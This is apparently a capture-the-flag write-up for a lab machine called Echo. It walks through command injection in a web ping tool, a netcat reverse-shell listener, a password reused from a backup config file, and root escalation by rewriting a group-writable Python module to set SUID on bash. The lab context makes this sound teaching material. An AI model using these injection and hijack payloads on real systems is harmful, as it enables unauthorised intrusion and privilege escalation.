# Echo — HackMyVM Writeup

Privilege escalation via a misconfigured sudo rule combined with a Python module import hijack.

## Summary

Command injection in a web-based ping utility leads to a www-data shell. Database credentials found in a backup config file are reused for login as user clara. An internal note hints at a misconfigured sudo rule, and a writable Python module allows import hijacking to escalate from clara to root.

## 1. Reconnaissance

Port scan revealed two open ports, including a web service with a "ping check" utility — a page that takes a host/IP and runs a system ping against it.

## 2. Initial Foothold — Command Injection

The ping field was tested for command injection:

- `127.0.0.1; id` — no result
- `127.0.0.1 | id` — returned `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, confirming the pipe operator was not filtered and commands executed as the web server user.

With confirmed injection, the payload was upgraded to a BusyBox reverse shell chained onto the ping input via the same `|` operator.

Caught the callback:

```
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.20.10.4] from (UNKNOWN) [172.20.10.3] 50574
```

Upgraded to a proper TTY:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Landed as www-data.

## 3. Credential Discovery

While enumerating the web root, a backup directory was discovered containing an internal DevOps note and a config.php backup:

```
Internal Note - DevOps Echo Team
---------------------------------
Hi Clara,

Please remember that system administration accounts must not share
credentials with web database connections in config.php.

Also, the echo-report utility in /usr/local/bin has been configured
with sudo access for the 'devs' team so you can test node health
summaries without requesting root password.

- DevOps Lead
```

```php
<?php
// Echo Appliance Database & Administration Configuration
// Maintainer: clara@echo.hmv

define('DB_HOST', 'localhost');
define('DB_PORT', 3306);
define('DB_USER', 'clara');
define('DB_PASS', 'EchoSummer2026!');
define('DB_NAME', 'echo_diagnostics');

define('SYSTEM_ADMIN', 'clara');
define('ENVIRONMENT', 'production');
?>
```

Despite the note explicitly warning against reusing credentials between the database and system accounts, the password was reused. This allowed a direct pivot:

```
www-data@echo:/var/www/html$ su clara
Password: 
clara@echo:~$
```

**User flag:**

```
cat user.txt
HMV{7e3a91c4b2d840f6a1e582c39d04b6a8}
```

## 4. Privilege Escalation Enumeration

The internal note's mention of echo-report having passwordless sudo access for the devs group was confirmed:

```
clara@echo:~$ id
uid=1001(clara) gid=1002(clara) groups=1002(clara),1001(devs)

clara@echo:~$ sudo -l
(ALL) NOPASSWD: /usr/local/bin/echo-report
```

## 5. Privilege Escalation — Python Module Hijacking

echo-report was a Python script that imported a local module, reporter, from /opt/echo/:

```
clara@echo:/opt/echo$ ls -la
-rw-rw-r-- 1 root  devs  57 Oct 14 12:14 reporter.py
```

Critically, reporter.py was group-writable by devs, and clara was a member of that group — meaning the module imported by the root-privileged script could be freely rewritten.

Several early attempts failed because the replacement module didn't match what echo-report's main() function actually called (reporter.run_report()), resulting in AttributeError. The working payload defined that exact function:

```python
import subprocess

def run_report():
    subprocess.run(["chmod", "u+s", "/bin/bash"])
```

Running the script via sudo executed the hijacked module as root:

```
clara@echo:/usr/local/bin$ sudo ./echo-report
clara@echo:/usr/local/bin$ bash -p
bash-5.3#
```

**Root flag:**

```
cat root.txt
HMV{5c1b82e9f403d7a86b2914c03e87d19f}
```

## Root Cause / Takeaways

- Command injection in a web diagnostics tool with insufficient input sanitization.
- Credential reuse between a database account and a system account, against the admin's own written policy.
- A sudo rule granting a group execution rights on a script that imports a module writable by that same group — a classic Python import-hijack privilege escalation, since sudo preserves the script's working directory import resolution but not the privilege boundary on its dependencies.
